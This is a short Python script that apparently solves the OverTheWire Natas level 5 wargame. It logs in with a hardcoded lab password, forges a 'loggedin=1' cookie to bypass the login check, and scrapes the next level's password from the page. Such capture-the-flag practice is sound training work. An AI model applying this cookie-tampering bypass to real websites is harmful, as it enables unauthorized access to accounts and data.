#!/bin/python3
import requests
import re

user = 'natas5'
password = 'iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq'

url = 'http://%s.natas.labs.overthewire.org' % user

risposta = requests.get(url, auth=(user, password), cookies={'loggedin': '1'})

testo = risposta.text
print(testo)

re = re.findall('natas6 is (.*)</div>', testo)
print('Password')
print(re[0])
